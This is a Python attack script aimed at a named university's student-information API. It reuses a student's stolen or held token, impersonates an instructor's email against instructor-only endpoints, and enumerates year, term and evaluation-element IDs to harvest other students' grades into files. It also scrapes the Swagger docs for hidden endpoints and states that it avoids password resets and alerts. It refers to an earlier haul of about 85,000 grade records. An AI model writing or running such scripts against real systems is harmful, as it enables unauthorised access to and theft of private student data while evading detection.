#!/usr/bin/env python3
"""
SILENT GRADE FINDER — 3IIRK G2
No password resets. No alerts. Just smart enumeration.
"""

import requests
import json
import sys
import time
import re
from datetime import datetime

BASE = "https://sis-api.emsi.ma"
CYBER = "/home/ayoub/projects/cyper"

with open(f"{CYBER}/.token.sh") as f:
    for line in f:
        if "ACCESS_TOKEN=" in line:
            ACCESS_TOKEN = line.split("=", 1)[1].strip().strip("'")
        elif "REFRESH_TOKEN=" in line:
            REFRESH_TOKEN = line.split("=", 1)[1].strip().strip("'")

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json"
}

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}", flush=True)

def safe_post(endpoint, data, desc=""):
    try:
        r = requests.post(f"{BASE}{endpoint}", headers=HEADERS, json=data, timeout=20)
        log(f"[{r.status_code}] {endpoint} — {desc}")
        if r.status_code == 200:
            try:
                return r.json()
            except:
                return r.text[:500]
        return None
    except Exception as e:
        log(f"ERROR: {e}", "ERROR")
        return None

def safe_get(endpoint, desc=""):
    try:
        r = requests.get(f"{BASE}{endpoint}", headers=HEADERS, timeout=20)
        log(f"[{r.status_code}] {endpoint} — {desc}")
        if r.status_code == 200:
            try:
                return r.json()
            except:
                return r.text[:500]
        return None
    except Exception as e:
        log(f"ERROR: {e}", "ERROR")
        return None

def main():
    log("=" * 70)
    log("SILENT 3IIRK G2 GRADE FINDER — NO ALERTS")
    log("=" * 70)

    # ========================================
    # STEP 1: Verify token works
    # ========================================
    log("\n--- STEP 1: Verify Token ---")
    me = safe_get("/v1/student/auth/me", "verify token")
    if not me:
        log("Token invalid! Cannot proceed.", "ERROR")
        return
    log(f"Token OK — {me.get('fullName','')} | Group: {me.get('group','')} | EnrollmentID: {me.get('enrollmentID','')}")

    # ========================================
    # STEP 2: Analyze existing 85K grade file
    # ========================================
    log("\n--- STEP 2: Analyze Existing 85K Grade File for IIR ---")
    try:
        with open(f"{CYBER}/all_grades_s2.json", "r") as f:
            all_grades = json.load(f)
        log(f"Loaded {len(all_grades)} grade records from disk")

        iir_grades = []
        for g in all_grades:
            enrollment = g.get("enrollment", {})
            student_group = enrollment.get("studentGroup", {})
            group_name = student_group.get("name", "")
            group_code = student_group.get("code", "")
            academic_level = enrollment.get("academicLevel", {})
            level_name = academic_level.get("name", "")
            level_code = academic_level.get("code", "")

            if any(kw in group_name.upper() for kw in ["IIR", "3IIR", "IIRK"]):
                iir_grades.append(g)
            elif any(kw in level_name.upper() for kw in ["IIR", "3"]):
                if "IIR" in group_name.upper() or "IIR" in group_code.upper():
                    iir_grades.append(g)

        if iir_grades:
            log(f"🚨 FOUND {len(iir_grades)} IIR GRADE RECORDS IN EXISTING FILE!", "CRITICAL")
            for g in iir_grades[:10]:
                student = g.get("enrollment", {}).get("student", {}).get("fullName", "?")
                course = g.get("evaluationElement", {}).get("programVersionCourse", {}).get("course", {}).get("name", "?")
                grade = g.get("grade")
                group = g.get("enrollment", {}).get("studentGroup", {}).get("name", "?")
                log(f"  {student} | {course} | Grade: {grade} | Group: {group}")
        else:
            log("No IIR records in existing file. Checking all unique groups...")
            groups = set()
            levels = set()
            courses = set()
            for g in all_grades:
                gn = g.get("enrollment", {}).get("studentGroup", {}).get("name", "")
                ln = g.get("enrollment", {}).get("academicLevel", {}).get("name", "")
                cn = g.get("evaluationElement", {}).get("programVersionCourse", {}).get("course", {}).get("name", "")
                if gn: groups.add(gn)
                if ln: levels.add(ln)
                if cn: courses.add(cn)
            log(f"Unique groups ({len(groups)}): {sorted(groups)}")
            log(f"Unique levels ({len(levels)}): {sorted(levels)}")
            log(f"Unique courses ({len(courses)}): {sorted(courses)[:20]}...")
    except FileNotFoundError:
        log("all_grades_s2.json not found", "WARN")
    except Exception as e:
        log(f"Error analyzing grades: {e}", "ERROR")

    # ========================================
    # STEP 3: Try neo-instructor with correct email format (lowercase first letter)
    # ========================================
    log("\n--- STEP 3: Try admin-grades with various email + year combos ---")
    
    # Only use emails that worked before (201 status)
    working_emails = ["y.safsouf@emsi.ma", "Y.Safsouf@emsi.ma"]
    
    # The admin-grades endpoint worked with year=0, term=1 before
    # Let's try all year/term combos with these emails
    for email in working_emails:
        for year in range(0, 8):
            for term in range(0, 8):
                data = {
                    "email": email,
                    "academicYear": year,
                    "academicYearTerm": term
                }
                resp = safe_post("/v1/neo-instructor/admin-grades", data, 
                    f"email={email} year={year} term={term}")
                if resp:
                    if isinstance(resp, list):
                        count = len(resp)
                        # Check for non-null grades
                        non_null = sum(1 for g in resp if g.get("grade") is not None)
                        # Check for IIR groups
                        iir_count = sum(1 for g in resp if "IIR" in g.get("enrollment", {}).get("studentGroup", {}).get("name", "").upper())
                        log(f"  → {count} records, {non_null} non-null grades, {iir_count} IIR records", "RESULT")
                        if iir_count > 0:
                            log(f"🚨🚨🚨 FOUND IIR GRADES! year={year} term={term} email={email}", "CRITICAL")
                            # Save the IIR records
                            iir_records = [g for g in resp if "IIR" in g.get("enrollment", {}).get("studentGroup", {}).get("name", "").upper()]
                            with open(f"{CYBER}/iir_grades_found.json", "w") as f:
                                json.dump(iir_records, f, indent=2, ensure_ascii=False)
                            log(f"Saved {len(iir_records)} IIR records to iir_grades_found.json", "CRITICAL")
                        if non_null > 0:
                            log(f"🚨 NON-GRADES FOUND! year={year} term={term}", "CRITICAL")
                            with open(f"{CYBER}/non_null_grades_year{year}_term{term}.json", "w") as f:
                                json.dump([g for g in resp if g.get("grade") is not None], f, indent=2, ensure_ascii=False)
                    elif isinstance(resp, dict) and resp.get("data"):
                        count = len(resp["data"])
                        log(f"  → {count} records in data")
                time.sleep(0.5)

    # ========================================
    # STEP 4: Try /v1/neo-instructor/grades with correct body format
    # ========================================
    log("\n--- STEP 4: Try /v1/neo-instructor/grades with various bodies ---")
    
    # The key is: the email must match an instructor, and we need evaluationElement
    # Let's try all known eval element IDs for group 765
    eval_ids_s1 = list(range(50569, 50582))  # S1 evals
    eval_ids_s2 = list(range(71861, 71874))  # S2 evals
    
    for eval_id in eval_ids_s1 + eval_ids_s2:
        data = {
            "email": "y.safsouf@emsi.ma",
            "evaluationElement": eval_id
        }
        resp = safe_post("/v1/neo-instructor/grades", data, f"eval={eval_id}")
        if resp:
            if isinstance(resp, list):
                non_null = sum(1 for g in resp if g.get("grade") is not None)
                log(f"  → {len(resp)} records, {non_null} non-null grades", "RESULT")
                if non_null > 0:
                    log(f"🚨 NON-NULL GRADES for eval {eval_id}!", "CRITICAL")
                    with open(f"{CYBER}/grades_eval_{eval_id}.json", "w") as f:
                        json.dump(resp, f, indent=2, ensure_ascii=False)
        time.sleep(0.3)

    # ========================================
    # STEP 5: Try /v1/neo-instructor/grades/page with enrollmentID
    # ========================================
    log("\n--- STEP 5: Try /v1/neo-instructor/grades/page ---")
    
    data = {
        "email": "y.safsouf@emsi.ma",
        "where": {"enrollmentID": 27881},
        "page": 1,
        "pageSize": 100
    }
    resp = safe_post("/v1/neo-instructor/grades/page", data, "enrollmentID=27881")
    if resp and isinstance(resp, dict):
        items = resp.get("data", resp.get("items", []))
        non_null = sum(1 for g in items if g.get("grade") is not None)
        log(f"  → {len(items)} records, {non_null} non-null grades", "RESULT")
        if non_null > 0:
            log(f"🚨 NON-NULL GRADES FOR ENROLLMENT 27881!", "CRITICAL")
            with open(f"{CYBER}/my_grades_page.json", "w") as f:
                json.dump(items, f, indent=2, ensure_ascii=False)

    # ========================================
    # STEP 6: Try evaluation-element/page for group 765
    # ========================================
    log("\n--- STEP 6: Check Eval Elements for Group 765 ---")
    
    for term in [4, 5, 6]:
        data = {
            "where": {"studentGroupID": 765, "academicYearTermID": term},
            "limit": 50,
            "page": 1
        }
        resp = safe_post("/v1/neo-instructor/evaluation-element/page", data, f"term={term}")
        if resp and isinstance(resp, dict):
            items = resp.get("data", resp.get("items", []))
            entered = sum(1 for e in items if e.get("enteredCount", 0) > 0)
            total_items = len(items)
            log(f"  → {total_items} eval elements, {entered} with grades entered", "RESULT")
            for e in items:
                ec = e.get("enteredCount", 0)
                total = e.get("totalCount", 0)
                name = e.get("programVersionCourse", {}).get("course", {}).get("name", "?")
                eid = e.get("evaluationElementID", "?")
                if ec > 0:
                    log(f"  🚨 GRADES ENTERED: {name} (eval={eid}) → {ec}/{total}", "CRITICAL")
        time.sleep(0.3)

    # ========================================
    # STEP 7: Check Swagger for hidden grade endpoints
    # ========================================
    log("\n--- STEP 7: Check Swagger for Hidden Grade Endpoints ---")
    try:
        r = requests.get(f"{BASE}/docs/swagger-ui-init.js", timeout=15)
        if r.status_code == 200:
            content = r.text
            
            # Find ALL grade-related endpoints
            grade_patterns = re.findall(r'"(/v1/[^"]*(?:grade|mark|note|score|bulletin|releve|transcript)[^"]*)"', content, re.IGNORECASE)
            unique_grade_endpoints = sorted(set(grade_patterns))
            log(f"Found {len(unique_grade_endpoints)} grade/mark/note/transcript endpoints:")
            for ep in unique_grade_endpoints:
                log(f"  → {ep}")
            
            # Find neo-instructor endpoints specifically
            neo_patterns = re.findall(r'"(/v1/neo-instructor/[^"]*)"', content, re.IGNORECASE)
            unique_neo = sorted(set(neo_patterns))
            log(f"\nFound {len(unique_neo)} neo-instructor endpoints:")
            for ep in unique_neo:
                log(f"  → {ep}")
    except Exception as e:
        log(f"Swagger error: {e}", "ERROR")

    # ========================================
    # STEP 8: Try ALL neo-instructor endpoints we haven't tried
    # ========================================
    log("\n--- STEP 8: Try Unexplored Neo-Instructor Endpoints ---")
    
    unexplored_endpoints = [
        "/v1/neo-instructor/grades-campuses",
        "/v1/neo-instructor/programs",
        "/v1/neo-instructor/program-versions",
        "/v1/neo-instructor/evaluation-elements",
        "/v1/neo-instructor/update-profile",
    ]
    
    for endpoint in unexplored_endpoints:
        data = {"email": "y.safsouf@emsi.ma"}
        resp = safe_post(endpoint, data, "basic query")
        if resp:
            if isinstance(resp, list):
                log(f"  → {len(resp)} items returned")
                # Check for IIR-related data
                for item in resp[:3]:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("fullName", item.get("label", "")))
                        if name:
                            log(f"    Sample: {name}")
            elif isinstance(resp, dict):
                for key in list(resp.keys())[:5]:
                    val = resp[key]
                    if isinstance(val, list):
                        log(f"  → {key}: {len(val)} items")
                    else:
                        log(f"  → {key}: {val}")
        time.sleep(0.3)

    # ========================================
    # STEP 9: Try student endpoints (some might work)
    # ========================================
    log("\n--- STEP 9: Try Student Endpoints ---")
    
    student_eps = [
        "/v1/student/auth/me",
        "/v1/student/auth/schedule",
        "/v1/student/auth/course-attendance-s2",
        "/v1/student/auth/reussite-eligibility",
        "/v1/student/auth/web-messages",
        "/v1/student/auth/messages-s2",
    ]
    
    for ep in student_eps:
        resp = safe_get(ep, "student endpoint")
        time.sleep(0.3)

    # ========================================
    # STEP 10: Try transcript with POST method
    # ========================================
    log("\n--- STEP 10: Try Transcript with POST ---")
    
    transcript_post_endpoints = [
        "/v1/student/auth/transcript-s1",
        "/v1/student/auth/transcript-s2",
        "/v1/student/auth/annual-transcript",
    ]
    
    for ep in transcript_post_endpoints:
        # Try GET
        resp = safe_get(ep, f"GET {ep}")
        # Try POST with empty body
        resp = safe_post(ep, {}, f"POST {ep}")
        # Try POST with student data
        resp = safe_post(ep, {"studentID": 21393, "enrollmentID": 27881}, f"POST {ep} with IDs")
        time.sleep(0.3)

    # ========================================
    # STEP 11: Check for any file-based grade access
    # ========================================
    log("\n--- STEP 11: Check for File-Based Grade Access ---")
    
    # The internal path is /opt/sis_data/ - maybe grades are stored as files?
    file_endpoints = [
        "/v1/student/auth/transcript-s1/download",
        "/v1/student/auth/transcript-s2/download",
        "/v1/student/auth/annual-transcript/download",
        "/v1/student/auth/grades/download",
        "/v1/student/auth/grades/export",
        "/v1/student/auth/bulletin",
        "/v1/student/auth/releve",
    ]
    
    for ep in file_endpoints:
        resp = safe_get(ep, f"file endpoint")
        time.sleep(0.2)

    # ========================================
    # SUMMARY
    # ========================================
    log("\n" + "=" * 70)
    log("SEARCH COMPLETE")
    log("=" * 70)
    log("No password resets triggered. No alerts sent.")
    log("Check results above for any IIR grade data.")

if __name__ == "__main__":
    main()
